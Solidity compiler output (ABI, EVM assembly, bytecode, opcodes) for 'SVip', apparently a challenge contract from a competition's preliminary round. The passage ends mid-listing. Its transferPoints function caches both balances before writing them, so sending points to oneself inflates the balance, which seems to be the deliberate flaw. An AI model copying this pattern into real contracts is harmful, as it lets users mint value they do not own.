{
	"赛题-预赛/第二题/SVip.sol": {
		"SVip": {
			"abi": [
				{
					"constant": false,
					"inputs": [
						{
							"name": "to",
							"type": "address"
						},
						{
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transferPoints",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"name": "",
							"type": "address"
						}
					],
					"name": "points",
					"outputs": [
						{
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"name": "",
							"type": "address"
						}
					],
					"name": "isSuperVip",
					"outputs": [
						{
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "getPoint",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "isComplete",
					"outputs": [
						{
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "promotionSVip",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "numOfFree",
					"outputs": [
						{
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"赛题-预赛/第二题/SVip.sol\":28:947  contract SVip {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x0\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"赛题-预赛/第二题/SVip.sol\":28:947  contract SVip {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"赛题-预赛/第二题/SVip.sol\":28:947  contract SVip {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x326f823f\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x358b8166\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x4095da72\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x5bea9faa\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xb2fa1c9e\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xdb78cdad\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xfab1512e\n      eq\n      tag_8\n      jumpi\n    tag_1:\n      0x0\n      dup1\n      revert\n        /* \"赛题-预赛/第二题/SVip.sol\":485:813  function transferPoints(address to, uint256 amount) public {\r... */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_9\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_9:\n        /* \"赛题-预赛/第二题/SVip.sol\":485:813  function transferPoints(address to, uint256 amount) public {\r... */\n      pop\n      tag_10\n      0x4\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      jump(tag_11)\n    tag_10:\n      stop\n        /* \"赛题-预赛/第二题/SVip.sol\":49:87  mapping(address => uint) public points */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_12\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_12:\n        /* \"赛题-预赛/第二题/SVip.sol\":49:87  mapping(address => uint) public points */\n      pop\n      tag_13\n      0x4\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      jump(tag_14)\n    tag_13:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第二题/SVip.sol\":94:136  mapping(address => bool) public isSuperVip */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_15\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_15:\n        /* \"赛题-预赛/第二题/SVip.sol\":94:136  mapping(address => bool) public isSuperVip */\n      pop\n      tag_16\n      0x4\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      jump(tag_17)\n    tag_16:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第二题/SVip.sol\":348:473  function getPoint() public{\r... */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_18\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_18:\n        /* \"赛题-预赛/第二题/SVip.sol\":348:473  function getPoint() public{\r... */\n      pop\n      tag_19\n      jump(tag_20)\n    tag_19:\n      stop\n        /* \"赛题-预赛/第二题/SVip.sol\":821:942  function isComplete() public view  returns(bool) {\r... */\n    tag_6:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_21:\n        /* \"赛题-预赛/第二题/SVip.sol\":821:942  function isComplete() public view  returns(bool) {\r... */\n      pop\n      tag_22\n      jump(tag_23)\n    tag_22:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第二题/SVip.sol\":176:340  function promotionSVip() public {\r... */\n    tag_7:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_24:\n        /* \"赛题-预赛/第二题/SVip.sol\":176:340  function promotionSVip() public {\r... */\n      pop\n      tag_25\n      jump(tag_26)\n    tag_25:\n      stop\n        /* \"赛题-预赛/第二题/SVip.sol\":143:167  uint256 public numOfFree */\n    tag_8:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_27:\n        /* \"赛题-预赛/第二题/SVip.sol\":143:167  uint256 public numOfFree */\n      pop\n      tag_28\n      jump(tag_29)\n    tag_28:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第二题/SVip.sol\":485:813  function transferPoints(address to, uint256 amount) public {\r... */\n    tag_11:\n        /* \"赛题-预赛/第二题/SVip.sol\":555:573  uint256 tempSender */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":605:619  uint256 tempTo */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":576:582  points */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":576:594  points[msg.sender] */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":583:593  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SVip.sol\":576:594  points[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n      sload\n        /* \"赛题-预赛/第二题/SVip.sol\":555:594  uint256 tempSender = points[msg.sender] */\n      swap2\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":622:628  points */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":622:632  points[to] */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":629:631  to */\n      dup6\n        /* \"赛题-预赛/第二题/SVip.sol\":622:632  points[to] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n      sload\n        /* \"赛题-预赛/第二题/SVip.sol\":605:632  uint256 tempTo = points[to] */\n      swap1\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":664:670  amount */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":651:661  tempSender */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":651:670  tempSender > amount */\n      gt\n        /* \"赛题-预赛/第二题/SVip.sol\":643:671  require(tempSender > amount) */\n      iszero\n      iszero\n      tag_31\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_31:\n        /* \"赛题-预赛/第二题/SVip.sol\":708:714  amount */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":699:705  amount */\n      dup4\n        /* \"赛题-预赛/第二题/SVip.sol\":690:696  tempTo */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":690:705  tempTo + amount */\n      add\n        /* \"赛题-预赛/第二题/SVip.sol\":690:714  tempTo + amount > amount */\n      gt\n        /* \"赛题-预赛/第二题/SVip.sol\":682:715  require(tempTo + amount > amount) */\n      iszero\n      iszero\n      tag_32\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_32:\n        /* \"赛题-预赛/第二题/SVip.sol\":760:766  amount */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":747:757  tempSender */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":747:766  tempSender - amount */\n      sub\n        /* \"赛题-预赛/第二题/SVip.sol\":726:732  points */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":726:744  points[msg.sender] */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":733:743  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SVip.sol\":726:744  points[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n        /* \"赛题-预赛/第二题/SVip.sol\":726:766  points[msg.sender] = tempSender - amount */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":799:805  amount */\n      dup3\n        /* \"赛题-预赛/第二题/SVip.sol\":790:796  tempTo */\n      dup2\n        /* \"赛题-预赛/第二题/SVip.sol\":790:805  tempTo + amount */\n      add\n        /* \"赛题-预赛/第二题/SVip.sol\":777:783  points */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":777:787  points[to] */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":784:786  to */\n      dup7\n        /* \"赛题-预赛/第二题/SVip.sol\":777:787  points[to] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n        /* \"赛题-预赛/第二题/SVip.sol\":777:805  points[to] = tempTo + amount */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":485:813  function transferPoints(address to, uint256 amount) public {\r... */\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第二题/SVip.sol\":49:87  mapping(address => uint) public points */\n    tag_14:\n      mstore(0x20, 0x0)\n      dup1\n      0x0\n      mstore\n      keccak256(0x0, 0x40)\n      0x0\n      swap2\n      pop\n      swap1\n      pop\n      sload\n      dup2\n      jump\t// out\n        /* \"赛题-预赛/第二题/SVip.sol\":94:136  mapping(address => bool) public isSuperVip */\n    tag_17:\n      mstore(0x20, 0x1)\n      dup1\n      0x0\n      mstore\n      keccak256(0x0, 0x40)\n      0x0\n      swap2\n      pop\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n        /* \"赛题-预赛/第二题/SVip.sol\":348:473  function getPoint() public{\r... */\n    tag_20:\n        /* \"赛题-预赛/第二题/SVip.sol\":405:408  100 */\n      0x64\n        /* \"赛题-预赛/第二题/SVip.sol\":393:402  numOfFree */\n      sload(0x2)\n        /* \"赛题-预赛/第二题/SVip.sol\":393:408  numOfFree < 100 */\n      lt\n        /* \"赛题-预赛/第二题/SVip.sol\":385:409  require(numOfFree < 100) */\n      iszero\n      iszero\n      tag_34\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_34:\n        /* \"赛题-预赛/第二题/SVip.sol\":442:443  1 */\n      0x1\n        /* \"赛题-预赛/第二题/SVip.sol\":420:426  points */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":420:438  points[msg.sender] */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":427:437  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SVip.sol\":420:438  points[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":420:443  points[msg.sender] += 1 */\n      dup3\n      dup3\n      sload\n      add\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":454:463  numOfFree */\n      0x2\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":454:465  numOfFree++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      0x1\n      add\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":348:473  function getPoint() public{\r... */\n      jump\t// out\n        /* \"赛题-预赛/第二题/SVip.sol\":821:942  function isComplete() public view  returns(bool) {\r... */\n    tag_23:\n        /* \"赛题-预赛/第二题/SVip.sol\":864:868  bool */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":889:899  isSuperVip */\n      0x1\n        /* \"赛题-预赛/第二题/SVip.sol\":889:911  isSuperVip[msg.sender] */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":900:910  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SVip.sol\":889:911  isSuperVip[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n      0x0\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"赛题-预赛/第二题/SVip.sol\":881:912  require(isSuperVip[msg.sender]) */\n      iszero\n      iszero\n      tag_36\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_36:\n        /* \"赛题-预赛/第二题/SVip.sol\":930:934  true */\n      0x1\n        /* \"赛题-预赛/第二题/SVip.sol\":923:934  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":821:942  function isComplete() public view  returns(bool) {\r... */\n      swap1\n      jump\t// out\n        /* \"赛题-预赛/第二题/SVip.sol\":176:340  function promotionSVip() public {\r... */\n    tag_26:\n        /* \"赛题-预赛/第二题/SVip.sol\":249:252  999 */\n      0x3e7\n        /* \"赛题-预赛/第二题/SVip.sol\":227:233  points */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":227:245  points[msg.sender] */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":234:244  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SVip.sol\":227:245  points[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n      sload\n        /* \"赛题-预赛/第二题/SVip.sol\":227:252  points[msg.sender] >= 999 */\n      lt\n      iszero\n        /* \"赛题-预赛/第二题/SVip.sol\":219:292  require(points[msg.sender] >= 999, \"Sorry, you don't have enough points\") */\n      iszero\n      iszero\n      tag_38\n      jumpi\n      mload(0x40)\n      0x8c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x23\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536f7272792c20796f7520646f6e2774206861766520656e6f75676820706f69\n      dup2\n      mstore\n      0x20\n      add\n      0x6e74730000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_38:\n        /* \"赛题-预赛/第二题/SVip.sol\":328:332  true */\n      0x1\n        /* \"赛题-预赛/第二题/SVip.sol\":303:313  isSuperVip */\n      dup1\n        /* \"赛题-预赛/第二题/SVip.sol\":303:325  isSuperVip[msg.sender] */\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":314:324  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SVip.sol\":303:325  isSuperVip[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x0\n      keccak256\n      0x0\n        /* \"赛题-预赛/第二题/SVip.sol\":303:332  isSuperVip[msg.sender] = true */\n      0x100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第二题/SVip.sol\":176:340  function promotionSVip() public {\r... */\n      jump\t// out\n        /* \"赛题-预赛/第二题/SVip.sol\":143:167  uint256 public numOfFree */\n    tag_29:\n      sload(0x2)\n      dup2\n      jump\t// out\n\n    auxdata: 0xa165627a7a72305820e8fafd8e41be42ff3d1dff337a93cce2cbd8709bf3fd67419ca36783a238b7130029\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506105b6806100206000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063326f823f14610088578063358b8166146100d55780634095da721461012c5780635bea9faa14610187578063b2fa1c9e1461019e578063db78cdad146101cd578063fab1512e146101e4575b600080fd5b34801561009457600080fd5b506100d3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061020f565b005b3480156100e157600080fd5b50610116600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610342565b6040518082815260200191505060405180910390f35b34801561013857600080fd5b5061016d600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061035a565b604051808215151515815260200191505060405180910390f35b34801561019357600080fd5b5061019c61037a565b005b3480156101aa57600080fd5b506101b36103ec565b604051808215151515815260200191505060405180910390f35b3480156101d957600080fd5b506101e261044d565b005b3480156101f057600080fd5b506101f9610584565b6040518082815260200191505060405180910390f35b6000806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205491506000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905082821115156102a257600080fd5b828382011115156102b257600080fd5b8282036000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508281016000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050505050565b60006020528060005260406000206000915090505481565b60016020528060005260406000206000915054906101000a900460ff1681565b606460025410151561038b57600080fd5b60016000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550600260008154809291906001019190505550565b6000600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151561044657600080fd5b6001905090565b6103e76000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015151561052b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260238152602001807f536f7272792c20796f7520646f6e2774206861766520656e6f75676820706f6981526020017f6e7473000000000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b60018060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550565b600254815600a165627a7a72305820e8fafd8e41be42ff3d1dff337a93cce2cbd8709bf3fd67419ca36783a238b7130029",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5B6 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x83 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x326F823F EQ PUSH2 0x88 JUMPI DUP1 PUSH4 0x358B8166 EQ PUSH2 0xD5 JUMPI DUP1 PUSH4 0x4095DA72 EQ PUSH2 0x12C JUMPI DUP1 PUSH4 0x5BEA9FAA EQ PUSH2 0x187 JUMPI DUP1 PUSH4 0xB2FA1C9E EQ PUSH2 0x19E JUMPI DUP1 PUSH4 0xDB78CDAD EQ PUSH2 0x1CD JUMPI DUP1 PUSH4 0xFAB1512E EQ PUSH2 0x1E4 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x94 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xD3 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x20F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xE1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x116 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x342 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x138 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x35A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x193 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19C PUSH2 0x37A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1AA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1B3 PUSH2 0x3EC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1D9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1E2 PUSH2 0x44D JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1F0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1F9 PUSH2 0x584 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP2 POP PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP DUP3 DUP3 GT ISZERO ISZERO PUSH2 0x2A2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 DUP4 DUP3 ADD GT ISZERO ISZERO PUSH2 0x2B2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 DUP3 SUB PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE 